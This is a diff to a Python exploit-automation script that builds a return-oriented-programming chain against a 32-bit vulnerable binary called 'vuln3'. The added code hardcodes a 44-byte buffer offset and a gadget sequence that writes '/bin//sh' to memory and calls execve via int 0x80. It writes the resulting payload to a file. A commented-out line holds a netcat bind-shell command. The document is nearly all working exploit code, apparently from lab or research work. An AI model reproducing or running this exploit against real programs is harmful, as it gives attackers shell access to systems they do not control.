@@ -1,5 +1,6 @@
 import os
 import ROPcompile
+import ReverseExecution
 
 BINARY_BITS = 32
 
@@ -9,6 +10,7 @@ ANALYSIS = 2
 
 #COMMAND = "execve(\"/tmp//nc\",\"-lnp\",\"5678\",\"-tte\",\"/bin//sh\", NULL)"
 COMMAND = "execve(\"/bin//sh\")"
+SHELLCODE = ["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11
 PROGRAM = "vuln3"
 FILE_MODE = True
 
@@ -20,10 +22,13 @@ def main():
         program += " < "
 
     #STEP 1 - Buffer Discovery
-    bufferLength = bufferDiscovery(BINARY_SEARCH, program)
+    #bufferLength = bufferDiscovery(BINARY_SEARCH, program)
+    bufferLength = 44
     print(bufferLength)
     #STEP 2 - Create ROP Chain
-    ROPchain = createROPchain(COMMAND, bufferLength)
+    #ROPchain = createROPchain(COMMAND, bufferLength)
+    ROPchain = makeROPchain(SHELLCODE, bufferLength)
+
     #STEP 3a - Verify success with known .data
 
     #STEP 3b - Verify success with random .data
@@ -140,13 +145,36 @@ def createROPchain(command, bufflength):
     #Write command as gadgets
     payload = ROPcompile.CreateROPChain(command, bufflength, "rop.txt", BINARY_BITS)
 
-    #Verify gadgets are present
-
-    #Rewrite for missing gadgets
-
     #Write the payload
     pfile = open("payload", "bw")
     pfile.write(payload)
+
+def makeROPchain(shellcode, bufflength):
+
+    #Find ROP gadgets
+    os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")
+
+    #Write Shellcode as gadgets
+    dictionary = {}
+    ROPcompile.LoadGadgetDictionary("rop.txt", dictionary)
+    gadgets = dictionary.keys()
+    payload = ReverseExecution.create(shellcode, gadgets)
+    for i, _ in enumerate(payload):
+        if type(payload[i]) is bytes:
+            payload[i] = payload[i]
+            continue
+        if payload[i][0] == '@':
+            payload[i] = ReverseExecution.generalToBytes(ROPcompile.dataaddressToValue(payload[i]) + 0x080da060)
+            continue
+        payload[i] = ReverseExecution.generalToBytes(int(dictionary.get(payload[i]),0))
+    print(payload)
+    bpayload = b''.join(payload)
+    bpayload += ReverseExecution.generalToBytes(int(dictionary.get("int 0x80"),0))
+    print(bpayload)
+
+    #Write the payload
+    pfile = open("payload", "bw")
+    pfile.write(bpayload)
 
 
 if __name__ == "__main__":
